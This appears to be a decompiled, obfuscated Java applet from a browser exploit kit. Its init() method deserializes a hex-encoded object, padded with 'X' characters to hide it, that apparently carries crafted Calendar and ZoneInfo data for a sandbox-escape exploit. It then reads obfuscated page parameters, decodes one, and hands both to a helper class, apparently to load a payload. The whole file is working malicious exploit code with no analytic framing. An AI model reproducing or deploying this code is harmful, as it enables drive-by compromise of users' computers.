// 
// Decompiled by Procyon v0.5.30
// 

package fiece;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.applet.Applet;

public class Oewofvc extends Applet
{
    private static final long serialVersionUID = -3238297386635759160L;
    private static final String serializedObject;
    public static String data;
    
    @Override
    public void init() {
        try {
            final Object object = new ObjectInputStream(new ByteArrayInputStream(Biutedwc.StringToBytes(Oewofvc.serializedObject))).readObject();
            final String parameter = this.getParameter("wfOO".replace("O", ""));
            String decodeString = Hjkwwww.decodeString(this.getParameter("hgggdggsx".replace("g", "")));
            if (object != null && MyYjefe.instance != null) {
                if (decodeString == null) {
                    decodeString = "";
                }
                MyYjefe.instance.__G(decodeString, parameter);
            }
        }
        catch (Exception ex) {}
    }
    
    static {
        serializedObject = "AXXXXCEXXXXXXD0XXXX0XXXX057XX3XXXXX7XXX2XXXXXX0XX01B6AXX6XXX1XX7X6XXX6XXX12XXXXEX7XX5746X9XXXX6XXXXCXXXXXX2XXE4XXXXX7XXXX7XXXX26567XXXX6XXXXF72X6XXXX9616E43X6X1XXX6XXCXXX65XX6XXE6461XXXXXXX72XXX8XXXXXFXXXX3XXXDXXD7D6E5XXXBXXXX0DXXX0XXXXXXXXC1X020XX00XX1XXXX4A0X0106X7XXXX726XXXX5XXXX6X7XXX6XXXXF7XXX269616XE4X3XX7XXXX574XXX6XXXXF766572XXX7XX8X7XXXX200XXXX1XXXX26XXA61XXXXXXX766X12EX7574XXXXX696XXXXC2XXXE4361X6C6XXX5XXX6XXXXE6XXXX4XXXX61XX7XXXX2EX6EXXXXXXAXXX4DXXX1XXXEXXXC8XXXXXDC5B8XXEXX03XX0XXX00XXBXX5A0XX00XXXXCX6XXX172XXX6X54669XXX65XXX6C6X47XXXXX3536XXXX57XX4XXX4XX9XX000E6X6697XXXX27X37X4XXX446XXXXXXX1XXX794XXXF66XX57656XXXX56BXX5XXXA0X00XX96XX9XXXX73XX54XXX69XX6DXX6XXX5X53XX65XXXX745A00XXX0X76CXXXX6XXXX5X6XXXXXXXE6965XXXX6XXXXE7XXX4490XXXX0166XDXX6XXXXXXX96EXXXX696D61XXX6XXXC446XXX17X9X7XXX349XX6XXE466XXXX9XX727XXX3XXX7X4XXXXX57XXXX6XXXX5X6XXX5XXXXX6B490XXXX0096EXXXX65XXXX78XX7X4XX5XX3XX746XXXX16DX7XXXX04900XX1573XXXX6XX57XX2XXX69XX6XXXXXXX1X6XXCXXX566X57XX2XX736X9XXX6FXX6EXXX4XXF6XXXEX537XXXX47XXX2X65X6XX1XXXX6DXXX4A0XXXXXX00474696D6XXXX55BXXX000666696XX5XXX6CXXXX647XXXXX3XXXX7XXX4XX0XXXX002XXX5BXX4X9XXXX5XBXXX00X0XX569XXXX7XX35XXXX3657XX4X74XXX0XXX0XXXX02XX5XXXXBXX5XXXAXXXX4XXXXC0XXX0X047XA6F6E6X57XXXX4001XXXX44CXX6A61X766XXXX12XXFXXXX7XX5XXX74XX696CXXXX2XFXX5X4XXXX69XXXXXX6XXD655A6XXXXF6E6XXXX5XXX3XXB7XX87XXXX0X010XX0XXX00XXXX0001XXXX0XXX1XX0XXXX10XXX00XXXX0XXXX0XX001XXXX0XXX0XX0XXX0XX0X0XXXXXX0200XXXX0000XX01XX0XXXX00001XXX2XXX1X5XXX6XXXX3AXXFC0EXX7XXX5X72XXX00025BXXXXXXX49XXX4XXXXDXBXXXXAX6X0XXXX2XXX676EAXXXXBXX2XAXXXXXX502XXX0000XX7XX87XXXX00X0XX00001XXX10X0000XXX0XXX0XXX10000XXX07D900XX0000XXX0XXXX4XX0XX000XX0XXX0XX1X50X0XXXX0XXXXX00XXX00XXX4XXXX00XXXXXXXX000XXXX0X12000XXXX0008XA00XXXX0XXXX0XXXX0XXXX002XXX00XXXXX0XXXX0X0XX00X30000XX000XXXXX10XXXXX0XXXX0000XX0XXXX4XXX0000001XXX00XXXXX0XXXXXXX00XXX0XXX01X1XXXX00000XX0XXXX220XXXX00002DEXXXXXFXEXXXX48XXX8CXXX00000XXXXXXX000XXXXX00XXXX75720XXX0XXXX0XXXX2X5XBXX5XA5XX78F20XXXX391XXX4BXXXX8XXX5XXXXDE2020XXX000X7X87XXXX0X00XXXX000011XXXX0X1XXXX01XXXXX01X0101X01X0101XX0XXX10X1XX0101XXXXX01XXXXX010X10XXXXX1017XXXXXX37X2X00XX1X8XXXX6A6XXXX17XX6XXXX6XXX12E75XX7X4XXXX6XX96C2E53696D706XXXXC6XX5XX5XXX46XXX96XXXD6X55XAX6XXXXFX6XXXXEX65FA67X5D6XX0XXXXXD1XXXX5XEXXF5AXX6XX0XX3X0X012XXX490XXX00XA647XXX374XXXX53XX61766X96EXXXX6773XX49X0XXXX0X06XXXX6X56E64446X17XXX9490XXX00XXXXC6X5X6E64XX4XX46179XXX4F66XXXX57X65656XXXXB4900XXX0XXXX765XXXX6E64XXX4D6XXXXXXFXXXX6XX4XXXX6XXX5X4900XXXX0X8XXXX656XE6XXXXXX4XX4D6XF6EXXXX74XXXXXX6XX84XX90X007XXX6XX5XXXX6EXXXX64546X9XXXX6DXXX6XXX5XXX4X9000B65XXXX6EXXXX64X546XXXXXXX9XX6XXDXX65XXXX4XXXDXXXX6F6X4XXXXXXX6XXX5490XXX00972X61XXXX7X74XXF66XX66XXX736XX574X4X90X0XX1XXX5XXX7XXXX3657269XXX61X6CXXX5X6XXXX6XXXX5XXX72X7XXX3696F6E4XF6XXE5X3747XXXX26XXX5XXXXX61XXXX6D49X00XXXX0XXX8XXXX73X7461X72744XXX4XXX6179XX49XXXXXXX00X0E7XXXX3XXXX746XXXX1727XXX4446XXX17XX94XXF6657656XXXXXX56XXBXX4XXXX90XXXX0XXXX0XXXX9XXXXXX737X461XXX7XXX2XX744XD6F6XX4X65XXXXXXXX4X90XXX0X0A737X4XXXX61XX7XXX27XXXX4XXX4DXXXX6XFX6EXX74XXX6XXXXXX84900097374X617274XX5XXXX46XXX9X6D654X9XXX00XX0DXXXX73746XX1XXX7274XX54X6XXXX96D65XX4D6XXF64654XXXX900XX097XX37XXXXXXX461XX72XXXXX74596561XXX725AXX0X00XXXXBXXX7XX57XXXXX3XXX65XXX44XXX617XX96CXXX69676XXXXX8XX7XXXXX4X5XXXXXB000XXXBX6XXXXD6XXXXXXXF6EXXXX74X6X84XXXXCXXXX656XXXXE67XXX74XX6874XXXX0XX002XXX5XXXB4XXXXXXX2XX787200126XXXAXXXX6XXX176612EXXXXXX7574XXX6XX9XX6C2XEXXX54XX6XXX9XXX6XXXDXX6XXX55XXXXA6F6XEXX6X531B3EXX9XXXF5XX7XXXX744XXXACAXX1XXXX02XX000XX14XC00XXX02XX4944740XX0124XXXXCXXX6XXXXAXXX6XXXXX17XXXXXXXX6XXX6XX1XX2XF6XXXXC6X1XX6XXXE6X72XXXFXX537X47269XX6XXE6XXXX7XXXX3B7870X740XXXX00XEXX416DXX6572XXXX696XX3XX6X12XXFX44XXXX6XXX17XX7X7XXX36XXXXFXXXX6XXE00XXX36EXXXXE8XX0X0X0XXXX0X00XXXX0000XX0XXXXXX0XXXX00XXXXX00000XX0X0X0000000XXX0XXXX00000XXXX0XXXXX000000X0XXXX00000XX00FE4XXXX88CXXXX00XX00XXX0XXXX00XXX002XXX000XXX0000000XXXX0XXX0X00XX0XXX0XXXX0X0XXX00XXX0000XXXX0X00000000XX00XXXX0000XXX000000XX00X0XXXX000XXXX00X000XX00XX757XXXX20XX0XXXX02XX5BXXXXXX42XXXAXXCXXFXXXX3XXXX17XFXXX8XXXX06XXXXX0854XXXXEXXXX00XXX2XXXX00XXXX0078XX7XX0XXX000XXXX0XXXX0XXX00XXXXC1FXX1XXC1XXXF1XE1FX1EXXX1F1XFXX1XXXEXXX1F1E1F7XX70AXXX0XX0XXX0XXXXX000XXX0XXXX6XX0XXXXX00X0X00XXX0X00000X75XX71X0XXX0X7E00XXXX0XXXX6XXXXX0XX0000XX002XXX000XXXX0XXXX0XXXXXXX0XXX0XXX00000XXX0XXXX000X7XX873XXXX7XXXX2000XXXXD6XXX66X9656XX3652E4DXXXX795XXX96XXXAXXX6XX5XXXX666XXXX5XXX5XXXEXXXX8XXBXXXX4CXXXX6X7XXXXXDXXXXXDC409XXXD8XXXX0X200XXX0XXXX07870X7XXXX8XXXXXFXXXXXXXFFXXFXXXFXX4XXXXEX2FXXXX9XXX6XXXXXX4AC000A".replace("X", "");
        Oewofvc.data = null;
    }
}